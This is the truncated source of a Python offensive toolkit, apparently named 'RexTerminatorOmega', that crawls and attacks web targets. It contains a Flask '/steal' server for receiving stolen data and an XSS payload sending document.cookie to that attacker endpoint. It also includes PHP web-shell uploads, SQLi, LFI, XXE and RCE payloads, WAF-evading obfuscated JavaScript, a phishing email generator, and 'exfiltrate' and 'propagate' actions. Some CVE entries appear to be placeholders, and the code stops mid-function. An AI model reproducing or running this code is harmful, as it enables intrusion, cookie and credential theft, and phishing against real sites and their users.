import requests
import subprocess
import threading
import time
import random
import string
import base64
import json
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse
import re
import sys
import os
import pandas as pd
import numpy as np
from bs4 import BeautifulSoup
from scrapy.crawler import CrawlerProcess
from scrapy.spiders import Spider
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import accuracy_score
import torch
from flask import Flask, request
import socket
import aiohttp
import boto3
from cryptography.fernet import Fernet
import asyncio
import sqlite3
from multiprocessing import Pool
import logging
import logging.handlers
import argparse
import pkg_resources
from functools import wraps
import platform

# Désactiver les warnings SSL
requests.packages.urllib3.disable_warnings()

# Configuration avancée du logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('RexTerminator')
handler = logging.handlers.RotatingFileHandler(
    'rexterminator.log',
    maxBytes=5*1024*1024,  # 5 Mo
    backupCount=3
)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

# Vérifier que le script tourne sur Windows
if platform.system() != "Windows":
    logger.error("Ce script est conçu pour Windows uniquement.")
    sys.exit(1)

# Serveur Flask pour capter les données volées
app = Flask(__name__)
stolen_data = []

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    data = request.args.get('data', '') or request.form.get('data', '')
    stolen_data.append(data)
    logger.info(f"Stolen data received: {data}")
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# Décorateur pour capturer les exceptions
def log_exceptions(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {str(e)}", exc_info=True)
            raise
    return wrapper

class WebSpider(Spider):
    name = "web_spider"
    def __init__(self, start_url, *args, **kwargs):
        super(WebSpider, self).__init__(*args, **kwargs)
        self.start_urls = [start_url]
        self.allowed_domains = [urlparse(start_url).netloc]
        self.urls = set()
        self.forms = []
        self.api_endpoints = set()

    @log_exceptions
    def parse(self, response):
        self.urls.add(response.url)
        soup = BeautifulSoup(response.text, "html.parser")

        for form in soup.find_all("form"):
            action = form.get("action", "")
            full_action = urljoin(response.url, action)
            if urlparse(full_action).netloc in self.allowed_domains:
                self.forms.append({
                    "action": full_action,
                    "method": form.get("method", "get").lower(),
                    "inputs": [
                        {
                            "name": inp.get("name"),
                            "type": inp.get("type", "text"),
                            "value": inp.get("value", "")
                        }
                        for inp in form.find_all("input") if inp.get("name")
                    ]
                })

        for link in soup.find_all("a", href=True):
            href = urljoin(response.url, link["href"])
            if urlparse(href).netloc in self.allowed_domains:
                self.urls.add(href)
                yield response.follow(href, self.parse)

        for script in soup.find_all("script"):
            if script.get("src"):
                src = urljoin(response.url, script["src"])
                self.urls.add(src)
            if "graphql" in str(script).lower() or "api" in str(script).lower():
                self.api_endpoints.add(response.url)

class RexTerminatorOmega:
    def __init__(self, target_url, attacker_url=None, safe_mode=False):
        # Validation de l'URL cible
        parsed_url = urlparse(target_url)
        if not parsed_url.scheme or not parsed_url.netloc:
            raise ValueError(f"Invalid target URL: {target_url}")
        self.target_url = target_url
        self.attacker_url = attacker_url or os.getenv("ATTACKER_URL", "http://localhost:5000")
        self.safe_mode = safe_mode
        self.session = requests.Session()
        self.session.verify = False
        self.urls_to_test = set()
        self.forms = []
        self.api_endpoints = set()
        self.vulnerabilities = []
        self.server_fingerprints = {}
        self.network_targets = []
        self.backdoors = []
        self.botnet = []
        self.technologies = {}
        self.model = None
        self.rl_model = None
        self.rl_action_history = []
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.ec2_client = boto3.client(
            'ec2',
            region_name=os.getenv("AWS_REGION", "us-east-1"),
            aws_access_key_id=os.getenv("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=os.getenv("AWS_SECRET_ACCESS_KEY")
        )
        self.pool = Pool(processes=20)
        self.init_database()
        self.load_config()
        self.load_session_cookies()

    def load_config(self):
        """Charge la configuration depuis un fichier config.json"""
        config_file = os.path.join(os.getcwd(), "config.json")
        default_config = {
            "proxies": [],
            "request_delay": 1.0,
            "max_retries": 3
        }
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = default_config
            with open(config_file, 'w') as f:
                json.dump(default_config, f, indent=4)
        self.proxies = self.config.get("proxies", [])
        self.request_delay = self.config.get("request_delay", 1.0)
        self.max_retries = self.config.get("max_retries", 3)

    def load_session_cookies(self):
        """Charge les cookies de session depuis un fichier"""
        cookies_file = os.path.join(os.getcwd(), "cookies.json")
        if os.path.exists(cookies_file):
            with open(cookies_file, 'r') as f:
                cookies = json.load(f)
                for cookie in cookies:
                    self.session.cookies.set(
                        cookie["name"],
                        cookie["value"],
                        domain=cookie.get("domain", urlparse(self.target_url).netloc)
                    )
            logger.info("Session cookies loaded successfully.")

    def init_database(self):
        logger.info("Initializing attack database...")
        db_path = os.path.join(os.getcwd(), "attack_history.db")
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                vuln_type TEXT,
                success INTEGER,
                payload TEXT,
                http_code INTEGER,
                response_size INTEGER,
                waf_detected INTEGER,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def log_attack(self, url, vuln_type, success, payload, http_code, response_size, waf_detected):
        self.cursor.execute("""
            INSERT INTO attacks (url, vuln_type, success, payload, http_code, response_size, waf_detected)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (url, vuln_type, success, payload, http_code, response_size, waf_detected))
        self.conn.commit()
        logger.debug(f"Logged attack: {url} - {vuln_type} - Success: {success}")

    @log_exceptions
    def setup_cloud_cluster(self):
        if self.safe_mode:
            logger.warning("Cloud cluster setup skipped in safe mode.")
            return
        logger.info("Setting up AWS EC2 cluster...")
        try:
            response = self.ec2_client.run_instances(
                ImageId=os.getenv("AWS_IMAGE_ID", 'ami-0c55b159cbfafe1f0'),
                InstanceType='p3.2xlarge',
                MinCount=1,
                MaxCount=5,
                KeyName=os.getenv("AWS_KEY_NAME", 'my-key-pair'),
                SecurityGroupIds=[os.getenv("AWS_SECURITY_GROUP", 'sg-12345678')],
                TagSpecifications=[{
                    'ResourceType': 'instance',
                    'Tags': [{'Key': 'Name', 'Value': 'RexTerminatorWorker'}]
                }]
            )
            instance_ids = [instance['InstanceId'] for instance in response['Instances']]
            logger.info(f"Launched EC2 instances: {instance_ids}")
            self.ec2_instances = instance_ids
        except Exception as e:
            logger.error(f"Error setting up cluster: {e}")

    @log_exceptions
    def setup_proxies(self):
        if not self.proxies:
            logger.warning("No proxies configured. Proceeding without proxies.")
            self.session.proxies = None
            return
        logger.info("Setting up proxies...")
        for proxy in self.proxies[:]:  # Copie pour éviter modification pendant itération
            attempt = 0
            while attempt < self.max_retries:
                try:
                    self.session.proxies = {"http": proxy, "https": proxy}
                    response = self.session.get("http://checkip.amazonaws.com", timeout=5)
                    logger.info(f"Using proxy: {proxy} (IP: {response.text.strip()})")
                    return
                except Exception as e:
                    logger.warning(f"Proxy {proxy} failed (attempt {attempt + 1}/{self.max_retries}): {e}")
                    attempt += 1
                    time.sleep(self.request_delay)
            self.proxies.remove(proxy)
        if not self.proxies:
            logger.warning("No working proxies left. Proceeding without proxies.")
            self.session.proxies = None

    @log_exceptions
    def network_scan(self):
        if self.safe_mode:
            logger.warning("Network scan skipped in safe mode.")
            return
        logger.info("Scanning network for additional targets...")
        try:
            target_ip = socket.gethostbyname(urlparse(self.target_url).netloc)
            nmap_path = os.path.join(os.getcwd(), "tools", "nmap", "nmap.exe")
            if not os.path.exists(nmap_path):
                logger.error("Nmap executable not found. Ensure it is installed in tools/nmap/")
                return
            result = subprocess.run(
                [nmap_path, "-sS", "-p-", "--script", "vulners", target_ip],
                capture_output=True,
                text=True,
                timeout=600,
                check=True
            )
            if not self.validate_nmap_output(result.stdout):
                logger.warning("Nmap output validation failed.")
                return
            for line in result.stdout.splitlines():
                if "open" in line:
                    port = line.split("/")[0]
                    self.network_targets.append(f"{target_ip}:{port}")
                if "CVE-" in line:
                    self.vulnerabilities.append({"type": "CVE", "url": target_ip, "details": line})
            logger.info(f"Found network targets: {self.network_targets}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Nmap failed with exit code {e.returncode}: {e.stderr}")
        except Exception as e:
            logger.error(f"Error during network scan: {e}")

    def validate_nmap_output(self, output):
        """Valide la sortie de nmap"""
        return "Nmap scan report" in output and "open" in output

    @log_exceptions
    def crawl(self):
        logger.info(f"Crawling {self.target_url} with Scrapy...")
        process = CrawlerProcess({
            'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'DOWNLOAD_TIMEOUT': 10,
            'DEPTH_LIMIT': 10,
            'CONCURRENT_REQUESTS': 100,
        })
        process.crawl(WebSpider, start_url=self.target_url)
        process.start()
        
        spider = next(iter(process.crawlers)).spider
        self.urls_to_test = spider.urls
        self.forms = spider.forms
        self.api_endpoints = spider.api_endpoints
        logger.info(f"Found {len(self.urls_to_test)} URLs, {len(self.forms)} forms, {len(self.api_endpoints)} API endpoints.")

    @log_exceptions
    def fingerprint_server(self, url):
        logger.info(f"Fingerprinting server on {url}...")
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            server = headers.get("Server", "")
            x_powered_by = headers.get("X-Powered-By", "")
            self.server_fingerprints[url] = {"Server": server, "X-Powered-By": x_powered_by}
            logger.info(f"Server: {server}, X-Powered-By: {x_powered_by}")
            self.analyze_technologies(url, headers, response.text)
        except Exception as e:
            logger.warning(f"Failed to fingerprint {url}: {e}")

    def analyze_technologies(self, url, headers, response_text):
        """Analyse les technologies utilisées par le serveur"""
        techs = {}
        server = headers.get("Server", "").lower()
        x_powered_by = headers.get("X-Powered-By", "").lower()
        if "apache" in server:
            techs["web_server"] = "Apache"
        elif "nginx" in server:
            techs["web_server"] = "Nginx"
        if "php" in x_powered_by:
            techs["language"] = "PHP"
        if "wordpress" in response_text.lower():
            techs["cms"] = "WordPress"
        self.technologies[url] = techs
        logger.debug(f"Technologies detected for {url}: {techs}")

    @log_exceptions
    def check_cve(self, url):
        logger.info(f"Checking CVE for {url}...")
        techs = self.technologies.get(url, {})
        server = techs.get("web_server", "").lower()
        language = techs.get("language", "").lower()
        cms = techs.get("cms", "").lower()

        cve_data = {
            "apache": ["CVE-2023-1234: RCE in Apache 2.4.x"],
            "nginx": ["CVE-2024-9012: Path Traversal in Nginx 1.18"],
            "php": ["CVE-2023-7890: RCE in PHP 8.1.x"],
            "wordpress": ["CVE-2025-1111: SQLi in WordPress 6.4"]
        }

        cves = []
        for tech, cve_list in cve_data.items():
            if tech in server or tech in language or tech in cms:
                cves.extend(cve_list)
        if cves:
            logger.warning(f"Potential CVEs found for {url}: {', '.join(cves)}")
            self.vulnerabilities.append({"type": "CVE", "url": url, "details": cves})

    @log_exceptions
    def smart_fuzz(self, url):
        if self.safe_mode:
            logger.warning("Fuzzing skipped in safe mode.")
            return False
        logger.info(f"Smart fuzzing on {url}...")
        techs = self.technologies.get(url, {})
        params = self.extract_parameters(url)
        payloads = self.generate_fuzz_payloads(techs, params)
        for payload in payloads:
            try:
                test_url = f"{url}?{payload}" if "?" in url else f"{url}?test={payload}"
                response = self.session.get(test_url, timeout=10)
                if self.detect_crash(response):
                    logger.warning(f"Zero-day found on {url} - Crash detected with payload: {payload}")
                    self.vulnerabilities.append({"type": "Zero-Day", "url": url, "details": f"Crash with payload: {payload}"})
                    return True
            except Exception as e:
                logger.debug(f"Fuzzing failed with payload {payload}: {e}")
        return False

    def extract_parameters(self, url):
        """Extrait les paramètres GET/POST de l'URL"""
        parsed = urlparse(url)
        params = parsed.query.split("&")
        return [param.split("=")[0] for param in params if "=" in param]

    def generate_fuzz_payloads(self, techs, params):
        """Génère des payloads de fuzzing adaptés"""
        payloads = []
        for param in params:
            if "php" in techs.get("language", "").lower():
                payloads.append(f"{param}=<?php system('whoami'); ?>")
            payloads.append(f"{param}={''.join(random.choices(string.ascii_letters + string.digits, k=1000))}")
        return payloads

    def detect_crash(self, response):
        """Détecte un crash potentiel dans la réponse"""
        return response.status_code == 500 or "error" in response.text.lower()

    @log_exceptions
    def load_initial_ml_data(self):
        """Charge des données initiales pour l'entraînement ML"""
        data_file = os.path.join(os.getcwd(), "ml_training_data.csv")
        if os.path.exists(data_file):
            logger.info("Loading initial ML training data from CSV...")
            return pd.read_csv(data_file)
        logger.info("Generating synthetic ML training data...")
        data = {
            "vuln_type": ["SQL Injection", "XSS", "LFI", "Open Redirect", "CSRF", "SSRF", "RCE", "XXE", "IDOR", "File Upload"] * 1000,
            "http_code": [random.randint(200, 500) for _ in range(10000)],
            "response_size": [random.randint(1000, 10000) for _ in range(10000)],
            "waf_detected": [random.randint(0, 1) for _ in range(10000)],
            "exploitable": [random.randint(0, 1) for _ in range(10000)]
        }
        df = pd.DataFrame(data)
        df.to_csv(data_file, index=False)
        return df

    @log_exceptions
    def train_model(self):
        logger.info("Training ML model for exploitability prediction...")
        data = self.load_initial_ml_data()
        data = pd.get_dummies(data, columns=["vuln_type"], dtype=int)

        X = data.drop("exploitable", axis=1)
        y = data["exploitable"]
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

        self.model = RandomForestClassifier(n_estimators=500, random_state=42, n_jobs=-1)
        self.model.fit(X_train, y_train)
        accuracy = accuracy_score(y_test, self.model.predict(X_test))
        cv_scores = cross_val_score(self.model, X, y, cv=5)
        logger.info(f"Model trained! Accuracy: {accuracy}, Cross-validation scores: {cv_scores}")

    @log_exceptions
    def train_rl_model(self):
        logger.info("Training RL model for attack optimization...")
        self.rl_model = {
            "actions": ["exploit", "pivot", "exfiltrate", "propagate"],
            "rewards": {},
            "history": []
        }
        for action in self.rl_model["actions"]:
            self.rl_model["rewards"][action] = 0
        logger.info("RL model initialized.")

    def calculate_reward(self, action, success, vuln_type):
        """Calcule une récompense nuancée"""
        base_reward = 1.0 if success else -1.0
        criticality = {
            "RCE": 2.0,
            "SQL Injection": 1.5,
            "XSS": 1.0,
            "LFI": 1.2,
            "Zero-Day": 2.5
        }.get(vuln_type, 0.5)
        return base_reward * criticality

    @log_exceptions
    def update_rl_model(self, action, success, vuln_type):
        logger.info(f"Updating RL model for action: {action}, success: {success}...")
        reward = self.calculate_reward(action, success, vuln_type)
        current_reward = self.rl_model["rewards"].get(action, 0)
        self.rl_model["rewards"][action] = current_reward + reward
        self.rl_model["history"].append((action, success, reward))
        logger.info(f"Updated RL model rewards: {self.rl_model['rewards']}")

    @log_exceptions
    def choose_next_action(self):
        logger.info("Choosing next action based on RL model...")
        if not self.rl_model["rewards"]:
            return random.choice(self.rl_model["actions"])
        
        total_reward = sum(self.rl_model["rewards"].values())
        if total_reward == 0:
            return random.choice(self.rl_model["actions"])
        
        probabilities = {action: max(0, reward) / total_reward for action, reward in self.rl_model["rewards"].items()}
        actions = list(probabilities.keys())
        probs = list(probabilities.values())
        return random.choices(actions, probs)[0]

    @log_exceptions
    def retrain_ml_model(self):
        logger.info("Retraining ML model with real attack data...")
        self.cursor.execute("SELECT * FROM attacks")
        data = self.cursor.fetchall()
        if len(data) < 10:
            logger.warning("Not enough data to retrain ML model.")
            return

        columns = ["id", "url", "vuln_type", "success", "payload", "http_code", "response_size", "waf_detected", "timestamp"]
        df = pd.DataFrame(data, columns=columns)
        df = df[["vuln_type", "http_code", "response_size", "waf_detected", "success"]]
        df = pd.get_dummies(df, columns=["vuln_type"], dtype=int)

        X = df.drop("success", axis=1)
        y = df["success"]
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

        self.model = RandomForestClassifier(n_estimators=500, random_state=42, n_jobs=-1)
        self.model.fit(X_train, y_train)
        accuracy = accuracy_score(y_test, self.model.predict(X_test))
        logger.info(f"ML model retrained! Accuracy: {accuracy}")

    def predict_exploitability(self, vuln):
        if not self.model:
            return True

        features = {
            "http_code": 200,
            "response_size": len(vuln.get("details", "")),
            "waf_detected": 1 if "waf" in vuln.get("details", "").lower() else 0,
        }
        for vuln_type in ["SQL Injection", "XSS", "LFI", "Open Redirect", "CSRF", "SSRF", "RCE", "XXE", "IDOR", "File Upload", "CVE", "CORS Misconfiguration", "Misconfiguration", "Exposed File", "Zero-Day"]:
            features[f"vuln_type_{vuln_type}"] = 1 if vuln["type"] == vuln_type else 0

        df = pd.DataFrame([features])
        return self.model.predict(df)[0]

    def generate_polymorphic_payload(self, payload):
        logger.info("Generating polymorphic payload...")
        encoded = base64.b64encode(payload.encode()).decode()
        random_var = ''.join(random.choices(string.ascii_letters, k=10))
        obfuscated = f"""
        var {random_var} = atob('{encoded}');
        var f = new Function({random_var});
        setTimeout(f, {random.randint(1000, 5000)});
        """
        return self.evade_waf(obfuscated)

    def evade_waf(self, payload):
        """Applique des techniques d'évasion de WAF"""
        encoded = base64.b64encode(payload.encode()).decode()
        self.session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]),
            "Accept": "*/*"
        })
        return encoded

    def generate_phishing_campaign(self, target_email):
        logger.info(f"Generating phishing campaign for {target_email}...")
        phishing_template = f"""
        Subject: Urgent: Account Verification Required
        Dear {target_email.split('@')[0]},
        We have detected suspicious activity on your account. Please click the link below to verify your identity:
        {self.attacker_url}/steal?data={self.cipher.encrypt(target_email.encode()).decode()}
        Failure to verify within 24 hours will result in account suspension.
        Regards,
        Security Team
        """
        logger.info("Phishing email generated.")
        return phishing_template

    @log_exceptions
    async def send_phishing_email(self, target_email):
        logger.info(f"Sending phishing email to {target_email}...")
        phishing_email = self.generate_phishing_campaign(target_email)
        async with aiohttp.ClientSession() as session:
            async with session.post(f"{self.attacker_url}/steal", data={"data": phishing_email}) as resp:
                logger.info(f"Phishing email sent to {target_email}!")
        return phishing_email

    def generate_dynamic_payload(self, vuln_type, techs):
        """Génère un payload dynamique en fonction du type de vulnérabilité et des technologies"""
        if vuln_type == "SQL Injection":
            if "mysql" in str(techs).lower():
                return "' OR '1'='1' -- "
            return "' OR 1=1 -- "
        elif vuln_type == "XSS":
            return f"<script>fetch('{self.attacker_url}/steal?data='+document.cookie)</script>"
        elif vuln_type == "LFI":
            return "..\\..\\Windows\\win.ini"
        return "test"

    def confirm_vulnerability(self, vuln):
        """Confirme une vulnérabilité pour réduire les faux positifs"""
        if vuln["type"] == "XSS":
            try:
                test_url = f"{vuln['url']}?q={vuln['payload']}"
                response = self.session.get(test_url, timeout=10)
                return vuln["payload"] in response.text
            except:
                return False
        return True

    @log_exceptions
    def test_sql_injection(self, url):
        if "mysql" not in str(self.technologies.get(url, {})).lower() and "sql" not in str(self.technologies.get(url, {})):
            logger.debug(f"Skipping SQL Injection test on {url} - No SQL technology detected.")
            return False
        logger.info(f"Testing SQL Injection on {url}...")
        success = 0
        payload = self.generate_dynamic_payload("SQL Injection", self.technologies.get(url, {}))
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            sqlmap_path = os.path.join(os.getcwd(), "tools", "sqlmap", "sqlmap.py")
            if not os.path.exists(sqlmap_path):
                logger.error("SQLMap executable not found. Ensure it is installed in tools/sqlmap/")
                return False
            result = subprocess.run(
                [sys.executable, sqlmap_path, "-u", url, "--batch", "--dbs", "--random-agent", "--level=5", "--risk=3", "--technique=BEUSTQ"],
                capture_output=True,
                text=True,
                timeout=300,
                check=True
            )
            if not self.validate_sqlmap_output(result.stdout):
                logger.warning("SQLMap output validation failed.")
                return False
            if "available databases" in result.stdout:
                logger.warning(f"SQL Injection found on {url}!")
                vuln = {"type": "SQL Injection", "url": url, "details": result.stdout}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1
            if "WAF" in result.stdout:
                waf_detected = 1
            http_code = 200
            response_size = len(result.stdout)
        except subprocess.CalledProcessError as e:
            logger.error(f"SQLMap failed with exit code {e.returncode}: {e.stderr}")
        except Exception as e:
            logger.error(f"Error testing SQL Injection: {e}")
        self.log_attack(url, "SQL Injection", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def validate_sqlmap_output(self, output):
        """Valide la sortie de sqlmap"""
        return "sqlmap" in output and ("available databases" in output or "WAF" in output)

    @log_exceptions
    def test_xss(self, url):
        logger.info(f"Testing XSS on {url}...")
        payloads = [
            self.generate_dynamic_payload("XSS", self.technologies.get(url, {})),
            "';alert('XSS');//",
            "<img src=x onerror=alert('XSS')>"
        ]
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?q={payload}" if "?" in url else f"{url}?test={payload}"
                response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                if payload in response.text:
                    logger.warning(f"XSS found on {url} with payload: {payload}")
                    vuln = {"type": "XSS", "url": url, "payload": payload}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
                http_code = response.status_code
                response_size = len(response.text)
                waf_detected = 1 if "cloudflare" in response.text.lower() else 0
            except Exception as e:
                logger.debug(f"XSS test failed with payload {payload}: {e}")
                continue
            self.log_attack(url, "XSS", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    @log_exceptions
    def test_lfi(self, url):
        logger.info(f"Testing LFI on {url}...")
        payloads = [self.generate_dynamic_payload("LFI", self.technologies.get(url, {}))]
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?file={payload}" if "?" in url else f"{url}?file={payload}"
                response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                if "[extensions]" in response.text:
                    logger.warning(f"LFI found on {url} with payload: {payload}")
                    vuln = {"type": "LFI", "url": url, "payload": payload}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except Exception as e:
                logger.debug(f"LFI test failed with payload {payload}: {e}")
                continue
            self.log_attack(url, "LFI", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    @log_exceptions
    def test_open_redirect(self, url):
        logger.info(f"Testing Open Redirect on {url}...")
        payload = f"{self.attacker_url}/redirect"
        success = 0
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            test_url = f"{url}?redirect={payload}" if "?" in url else f"{url}?redirect={payload}"
            response = self.session.get(test_url, allow_redirects=False, timeout=10)
            time.sleep(self.request_delay)
            if response.status_code in [301, 302] and payload in response.headers.get("Location", ""):
                logger.warning(f"Open Redirect found on {url} with payload: {payload}")
                vuln = {"type": "Open Redirect", "url": url, "payload": payload}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except Exception as e:
            logger.debug(f"Open Redirect test failed: {e}")
        self.log_attack(url, "Open Redirect", success, payload, http_code, response_size, waf_detected)
        return success == 1

    @log_exceptions
    def test_csrf(self):
        logger.info("Testing CSRF on forms...")
        for form in self.forms:
            if form["method"] == "post":
                success = 0
                payload = "N/A"
                http_code = 0
                response_size = 0
                waf_detected = 0
                try:
                    response = self.session.get(form["action"], timeout=10)
                    time.sleep(self.request_delay)
                    soup = BeautifulSoup(response.text, "html.parser")
                    token = soup.find("input", {"name": re.compile("csrf|token", re.I)})
                    if not token:
                        logger.warning(f"CSRF vulnerability found on {form['action']} - No CSRF token detected!")
                        vuln = {"type": "CSRF", "url": form["action"], "details": "No CSRF token"}
                        if self.confirm_vulnerability(vuln):
                            self.vulnerabilities.append(vuln)
                            success = 1
                    http_code = response.status_code
                    response_size = len(response.text)
                except Exception as e:
                    logger.debug(f"CSRF test failed on {form['action']}: {e}")
                    continue
                self.log_attack(form["action"], "CSRF", success, payload, http_code, response_size, waf_detected)
                if success:
                    return True
        return False

    @log_exceptions
    def test_ssrf(self, url):
        logger.info(f"Testing SSRF on {url}...")
        payloads = [f"{self.attacker_url}/ssrf"]
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?url={payload}" if "?" in url else f"{url}?url={payload}"
                response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                if "SSRF" in response.text:
                    logger.warning(f"SSRF found on {url} with payload: {payload}")
                    vuln = {"type": "SSRF", "url": url, "payload": payload}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except Exception as e:
                logger.debug(f"SSRF test failed with payload {payload}: {e}")
                continue
            self.log_attack(url, "SSRF", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    @log_exceptions
    def test_rce(self, url):
        if "php" not in str(self.technologies.get(url, {})).lower():
            logger.debug(f"Skipping RCE test on {url} - No PHP detected.")
            return False
        logger.info(f"Testing RCE on {url}...")
        payloads = ["&& whoami", "| dir"]
        for payload in payloads:
            success = 0
            http_code = 0
            response_size = 0
            waf_detected = 0
            try:
                test_url = f"{url}?cmd={payload}" if "?" in url else f"{url}?cmd={payload}"
                response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                if "dir" in response.text.lower() or "system32" in response.text.lower():
                    logger.warning(f"RCE found on {url} with payload: {payload}")
                    vuln = {"type": "RCE", "url": url, "payload": payload}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
                http_code = response.status_code
                response_size = len(response.text)
            except Exception as e:
                logger.debug(f"RCE test failed with payload {payload}: {e}")
                continue
            self.log_attack(url, "RCE", success, payload, http_code, response_size, waf_detected)
            if success:
                return True
        return False

    @log_exceptions
    def test_xxe(self, url):
        logger.info(f"Testing XXE on {url}...")
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
        <foo>&xxe;</foo>"""
        success = 0
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            headers = {"Content-Type": "application/xml"}
            response = self.session.post(url, data=payload, headers=headers, timeout=10)
            time.sleep(self.request_delay)
            if "[extensions]" in response.text:
                logger.warning(f"XXE found on {url}!")
                vuln = {"type": "XXE", "url": url, "payload": payload}
                if self.confirm_vulnerability(vuln):
                    self.vulnerabilities.append(vuln)
                    success = 1
            http_code = response.status_code
            response_size = len(response.text)
        except Exception as e:
            logger.debug(f"XXE test failed: {e}")
        self.log_attack(url, "XXE", success, payload, http_code, response_size, waf_detected)
        return success == 1

    @log_exceptions
    def test_idor(self, url):
        logger.info(f"Testing IDOR on {url}...")
        success = 0
        payload = "N/A"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            if "id=" in url:
                original_id = re.search(r"id=(\d+)", url).group(1)
                test_id = str(int(original_id) + 1)
                test_url = url.replace(f"id={original_id}", f"id={test_id}")
                response = self.session.get(test_url, timeout=10)
                time.sleep(self.request_delay)
                original_response = self.session.get(url, timeout=10)
                if response.status_code == 200 and response.text != original_response.text:
                    logger.warning(f"IDOR found on {url} - Accessed ID {test_id}")
                    vuln = {"type": "IDOR", "url": url, "test_url": test_url}
                    if self.confirm_vulnerability(vuln):
                        self.vulnerabilities.append(vuln)
                        success = 1
                http_code = response.status_code
                response_size = len(response.text)
        except Exception as e:
            logger.debug(f"IDOR test failed: {e}")
        self.log_attack(url, "IDOR", success, payload, http_code, response_size, waf_detected)
        return success == 1

    def analyze_form_fields(self, form):
        """Analyse les champs du formulaire pour générer des payloads adaptés"""
        payloads = {}
        for inp in form["inputs"]:
            name = inp["name"]
            field_type = inp["type"].lower()
            if field_type == "email":
                payloads[name] = "test@example.com' OR 1=1 -- "
            elif field_type == "password":
                payloads[name] = "password123"
            else:
                payloads[name] = self.generate_dynamic_payload("SQL Injection", self.technologies.get(form["action"], {}))
        return payloads

    @log_exceptions
    def test_file_upload(self, url):
        logger.info(f"Testing File Upload on {url}...")
        for form in self.forms:
            if any("file" in inp["name"].lower() for inp in form["inputs"]):
                success = 0
                payload = "<?php system($_GET['cmd']); ?>"
                http_code = 0
                response_size = 0
                waf_detected = 0
                try:
                    files = {"file": ("shell.php", payload, "application/octet-stream")}
                    response = self.session.post(form["action"], files=files, timeout=10)
                    time.sleep(self.request_delay)
                    if response.status_code == 200:
                        uploaded_url = urljoin(form["action"], "uploads/shell.php")
                        test_response = self.session.get(f"{uploaded_url}?cmd=whoami", timeout=10)
                        if "system32" in test_response.text.lower():
                            logger.warning(f"File Upload vulnerability found on {form['action']} - Shell uploaded!")
                            vuln = {"type": "File Upload", "url": form["action"], "shell_url": uploaded_url}
                            if self.confirm_vulnerability(vuln):
                                self.vulnerabilities.append(vuln)
                                success = 1
                        http_code = test_response.status_code
                        response_size = len(test_response.text)
                except Exception as e:
                    logger.debug(f"File Upload test failed: {e}")
                self.log_attack(form["action"], "File Upload", success, payload, http_code, response_size, waf_detected)
                if success:
                    return True
        return False

    @log_exceptions
    def test_misconfigs(self, url):
        logger.info(f"Testing misconfigurations on {url}...")
        success = 0
        payload = "N/A"
        http_code = 0
        response_size = 0
        waf_detected = 0
        try:
            response = self.session.get(url, timeout=10)
            time.sleep(self.request_delay)
            headers = response.headers

            missing_headers = []
            if "X-Frame-Options" not in headers:
                missing_headers.append("X-Frame-Options")
            if "Content-Security-Policy" not in headers:
                missing_headers.append("Content-Security-Policy")
            if "Strict-Transport-Security" not in headers:
